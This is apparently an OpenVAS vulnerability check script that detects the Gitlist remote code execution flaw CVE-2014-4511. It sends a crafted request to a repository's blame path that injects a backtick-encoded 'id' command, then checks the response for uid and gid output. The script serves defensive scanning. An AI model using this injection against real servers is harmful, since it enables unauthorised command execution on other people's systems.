###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_gitlist_rce_06_14.nasl 2780 2016-03-04 13:12:04Z antu123 $
#
# Gitlist Remote Code Execution Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2014 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_insight = "An anonymous user could execute commands because of a
complete lack of input sanitizatioin";

tag_impact = "Successfully exploiting this issue allows attackers to execute
arbitrary code in the context of the affected application.";

tag_affected = "Gitlist <= 0.4.0";

tag_summary = "Gitlist is prone to remote code execution vulnerability.";
tag_solution = "Update to Gitlist >= 0.5.0";
tag_vuldetect = "Send a special crafted HTTP GET request and check the response.";

if (description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.105052");
 script_cve_id("CVE-2014-4511");
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_version ("$Revision: 2780 $");

 script_name("Gitlist Remote Code Execution Vulnerability");


 script_xref(name:"URL", value:"http://hatriot.github.io/blog/2014/06/29/gitlist-rce/");
 

 script_tag(name:"last_modification", value:"$Date: 2016-03-04 14:12:04 +0100 (Fri, 04 Mar 2016) $");
 script_tag(name:"creation_date", value:"2014-06-30 13:00:23 +0200 (Mon, 30 Jun 2014)");
 script_summary("Determine if it is possible to execute a command");
 script_category(ACT_ATTACK);
 script_tag(name:"qod_type", value:"remote_vul");
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2014 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");

 script_tag(name : "impact" , value : tag_impact);
 script_tag(name : "vuldetect" , value : tag_vuldetect);
 script_tag(name : "insight" , value : tag_insight);
 script_tag(name : "solution" , value : tag_solution);
 script_tag(name : "summary" , value : tag_summary);
 script_tag(name : "affected" , value : tag_affected);

 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port( default:80 );
if( ! get_port_state( port ) ) exit( 0 );

dirs = make_list( "/gitlist/", "/git/", cgi_dirs() );

foreach dir ( dirs )
{  
  url = dir;
  req = http_get( item:url, port:port );
  buf = http_send_recv( port:port, data:req, bodyonly:FALSE );

  if( egrep( pattern:"Powered by.*GitList", string:buf ) )
  {
    repos = eregmatch( pattern:'class="icon-folder-open icon-spaced"></i> <a href="([^"]+)">', string:buf );
    if( isnull( repos[1] ) ) continue;

    repo = repos[1];

    url = repo + 'blame/master/""</%60id%60';
    req = http_get( item:url, port:port );
    buf = http_send_recv( port:port, data:req, bodyonly:FALSE );

    if( buf =~ "uid=[0-9]+.*gid=[0-9]+" )
    {
      req_resp = 'Request:\n' + req + '\nResponse:\n' + buf;
      security_message( port:port, expert_info:req_resp );
      exit( 0 );
    }  
  }  
}

exit( 99 );

